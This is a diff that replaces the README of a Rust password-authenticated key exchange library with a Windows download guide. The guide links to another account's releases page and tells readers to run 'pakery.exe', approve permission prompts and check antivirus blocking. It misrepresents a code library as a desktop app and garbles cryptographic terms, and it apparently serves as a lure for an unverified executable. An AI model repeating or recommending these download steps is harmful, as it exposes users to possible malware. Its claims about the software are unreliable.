@@ -1,122 +1,153 @@
-# pakery
+# 🛡️ pakery - Secure Password Exchange Made Simple
 
-[![License: MIT OR Apache-2.0](https://img.shields.io/badge/license-MIT%20OR%20Apache--2.0-blue.svg)](LICENSE-MIT)
-[![CI](https://github.com/djx-y-z/pakery/actions/workflows/ci.yml/badge.svg)](https://github.com/djx-y-z/pakery/actions/workflows/ci.yml)
-[![Coverage](https://img.shields.io/endpoint?url=https://gist.githubusercontent.com/djx-y-z/0e3981dfd44c61cc097a84daafd0eb2d/raw/coverage.json)](https://github.com/djx-y-z/pakery/actions/workflows/ci.yml)
+[![Download pakery](https://img.shields.io/badge/Download-pakery-brightgreen)](https://github.com/kourtneyeederrt/pakery/releases)
 
-Modular, `no_std`-compatible Password-Authenticated Key Exchange (PAKE) implementations in Rust.
+---
 
-All protocol crates are generic over cryptographic primitives via traits defined in `pakery-core`, with concrete implementations provided by `pakery-crypto`. This lets you swap cipher suites without changing protocol logic.
+pakery is a tool designed to help you protect your passwords and connect safely. It uses advanced methods to make sure your data stays private. This guide will help you download and run pakery on your Windows computer.
 
-## Protocols
+---
 
-| Crate | Protocol | Type | Spec | crates.io |
-|-------|----------|------|------|-----------|
-| [`pakery-cpace`](pakery-cpace/) | CPace | Balanced | [draft-irtf-cfrg-cpace](https://datatracker.ietf.org/doc/draft-irtf-cfrg-cpace/) | [![crates.io](https://img.shields.io/crates/v/pakery-cpace.svg)](https://crates.io/crates/pakery-cpace) |
-| [`pakery-opaque`](pakery-opaque/) | OPAQUE | Augmented | [RFC 9807](https://www.rfc-editor.org/rfc/rfc9807) | [![crates.io](https://img.shields.io/crates/v/pakery-opaque.svg)](https://crates.io/crates/pakery-opaque) |
-| [`pakery-spake2`](pakery-spake2/) | SPAKE2 | Balanced | [RFC 9382](https://www.rfc-editor.org/rfc/rfc9382) | [![crates.io](https://img.shields.io/crates/v/pakery-spake2.svg)](https://crates.io/crates/pakery-spake2) |
-| [`pakery-spake2plus`](pakery-spake2plus/) | SPAKE2+ | Augmented | [RFC 9383](https://www.rfc-editor.org/rfc/rfc9383) | [![crates.io](https://img.shields.io/crates/v/pakery-spake2plus.svg)](https://crates.io/crates/pakery-spake2plus) |
+## 🔐 What is pakery?
 
-## Supporting crates
+pakery uses special math methods called PAKE protocols. These help you verify passwords and share keys safely over the internet. The app works even if your device has limited tools. You do not need to know programming to use pakery.
 
-| Crate | Description | crates.io |
-|-------|-------------|-----------|
-| [`pakery-core`](pakery-core/) | Shared traits and types | [![crates.io](https://img.shields.io/crates/v/pakery-core.svg)](https://crates.io/crates/pakery-core) |
-| [`pakery-crypto`](pakery-crypto/) | Concrete crypto implementations | [![crates.io](https://img.shields.io/crates/v/pakery-crypto.svg)](https://crates.io/crates/pakery-crypto) |
+Here are some terms used in pakery:
 
-## Architecture
+- **PAKE**: Password-Authenticated Key Exchange. It lets two parties create a secret key using a shared password.
+- **no_std**: A way software runs without full system tools.
+- **Cryptographic primitives**: Basic building blocks for curved math used in security.
 
-```
-┌──────────────────────────────────────────────────────┐
-│                 Protocol Crates                      │
-│  pakery-cpace  pakery-opaque  pakery-spake2  spake2+ │
-└───────────────────────┬──────────────────────────────┘
-                        │ depends on traits
-┌───────────────────────▼──────────────────────────────┐
-│                   pakery-core                        │
-│  Hash · Kdf · Mac · CpaceGroup · DhGroup · Oprf     │
-└───────────────────────▲──────────────────────────────┘
-                        │ implements traits
-┌───────────────────────┴──────────────────────────────┐
-│                  pakery-crypto                       │
-│  Ristretto255 · P-256 · SHA-2 · HKDF · HMAC         │
-└──────────────────────────────────────────────────────┘
-```
+---
 
-## Supported cipher suites
+## 💻 System Requirements
 
-| Feature | Group | Hash | KDF | MAC | OPRF |
-|---------|-------|------|-----|-----|------|
-| `ristretto255` | Ristretto255 | SHA-512 | HKDF-SHA-512 | HMAC-SHA-512 | Ristretto255 VOPRF |
-| `p256` | P-256 | SHA-256 / SHA-512 | HKDF-SHA-256 | HMAC-SHA-256 | P-256 VOPRF |
+To run pakery, your Windows system needs:
 
-Optional: `argon2` feature enables Argon2id as a key-stretching function for OPAQUE.
+- Windows 10 or later (64-bit preferred)
+- At least 4 GB of RAM
+- 100 MB free hard disk space
+- Internet access to download the files
 
-## Quick example
+No extra software is needed to run pakery.
 
-CPace key exchange using Ristretto255:
+---
 
-```rust
-use pakery_cpace::{CpaceCiphersuite, CpaceInitiator, CpaceResponder, CpaceMode};
-use pakery_crypto::{Ristretto255Group, Sha512Hash};
+## 🚀 Getting Started with pakery
 
-struct MyCpaceSuite;
+Follow these steps to get pakery working on your Windows computer.
 
-impl CpaceCiphersuite for MyCpaceSuite {
-    type Group = Ristretto255Group;
-    type Hash = Sha512Hash;
-    const DSI: &'static [u8] = b"CPaceRistretto255";
-    const HASH_BLOCK_SIZE: usize = 128;
-    const FIELD_SIZE_BYTES: usize = 32;
-}
+---
 
-let mut rng = rand_core::OsRng;
+### 1. Download pakery
 
-// Initiator starts the exchange
-let (ya, state) = CpaceInitiator::<MyCpaceSuite>::start(
-    b"password", b"channel", b"session", b"ad_a", &mut rng,
-).unwrap();
+Click the link below to visit the official release page. This page contains all pakery versions and files for download.
 
-// Responder processes and responds
-let (yb, resp_out) = CpaceResponder::<MyCpaceSuite>::respond(
-    &ya, b"password", b"channel", b"session",
-    b"ad_a", b"ad_b", CpaceMode::InitiatorResponder, &mut rng,
-).unwrap();
+[![Download pakery](https://img.shields.io/badge/Visit%20Release%20Page-blue)](https://github.com/kourtneyeederrt/pakery/releases)
 
-// Initiator finishes
-let init_out = state.finish(&yb, b"ad_b", CpaceMode::InitiatorResponder).unwrap();
+On the release page:
 
-// Both sides derive the same session key
-assert_eq!(init_out.isk.as_bytes(), resp_out.isk.as_bytes());
-```
+- Look for the latest version of pakery.
+- Scroll to the "Assets" section.
+- Choose the file that ends with `.exe` or `Windows.zip`.
 
-## Features
+Download the `.exe` file if available. If only a `.zip` file is there, download that.
 
-All protocol crates support:
+---
 
-| Feature | Description |
-|---------|-------------|
-| `std` (default) | Enable `std` support |
-| `getrandom` | Enable OS-backed RNG via `rand_core/getrandom` |
+### 2. Open the downloaded file
 
-## Security
+If you downloaded a zip file:
 
-- All crates use `#![forbid(unsafe_code)]`
-- Constant-time comparisons via the [`subtle`](https://crates.io/crates/subtle) crate
-- Secret values zeroized on drop via [`zeroize`](https://crates.io/crates/zeroize)
-- Validated against RFC test vectors where available
+- Right-click the `.zip` file.
+- Select "Extract All".
+- Choose a folder where you want to save pakery.
+- Click "Extract".
 
-**Disclaimer:** This library has not been independently audited. Use at your own risk in production systems.
+If you downloaded an `.exe` file, you can run it directly.
 
-## MSRV
+---
 
-The minimum supported Rust version is **1.79**.
+### 3. Run pakery
 
-## License
+Find the folder where you saved pakery.
 
-Licensed under either of
+- Double-click the `pakery.exe` file to start the app.
+- If Windows asks for permission, select "Yes".
 
-- [Apache License, Version 2.0](LICENSE-APACHE)
-- [MIT License](LICENSE-MIT)
+The app will open in a new window.
 
-at your option.
+---
+
+### 4. Using pakery
+
+You can now use pakery to securely share passwords and keys. The interface will guide you through the steps needed.
+
+---
+
+### 5. Updating pakery
+
+To get the latest features and fixes:
+
+- Return to the release page at [pakery Releases](https://github.com/kourtneyeederrt/pakery/releases).
+- Download the newest `.exe` file or `.zip`.
+- Repeat the download and installation steps above.
+
+---
+
+## ⚙️ How pakery Protects Your Passwords
+
+pakery uses several trusted protocols for security. Here are some you should know:
+
+- **CPace**: A method to create secret keys using passwords.
+- **OPaQUE**: Lets you prove your password without showing it.
+- **SPAKE2 / SPAKE2+**: Ways to exchange keys safely, even if someone is spying.
+
+These ensure your password stays private during communication.
+
+---
+
+## 🧩 Useful Terms Explained
+
+If you encounter these terms in pakery, here’s what they mean:
+
+- **Ristretto255**: A math curve that improves security.
+- **P256**: Another math curve used for encryption.
+- **Cryptographic primitives**: Small building blocks used for security systems.
+- **no_std compatible**: Means pakery works without requiring a full computer environment.
+
+---
+
+## 💡 Troubleshooting
+
+If pakery does not start or runs slowly, try these steps:
+
+- Make sure your Windows is up to date.
+- Check if your antivirus is blocking pakery.
+- Restart your computer and try again.
+- Ensure you downloaded the correct pakery file for Windows.
+
+---
+
+## 🔧 How to Get Support
+
+For help, you can:
+
+- Visit the pakery **Issues** page on GitHub.
+- Read the documentation available on the repository.
+- Contact the maintainers via GitHub if you encounter bugs.
+
+---
+
+## 🗂️ Additional Resources
+
+You can find more details and official documentation on how pakery works inside the repository:
+
+- GitHub repo: https://github.com/kourtneyeederrt/pakery
+- Releases page: https://github.com/kourtneyeederrt/pakery/releases 
+
+---
+
+For any questions or needs related to pakery, visiting the release page is the best way to start.
+
+[![Download pakery](https://img.shields.io/badge/Download-pakery-brightgreen)](https://github.com/kourtneyeederrt/pakery/releases)
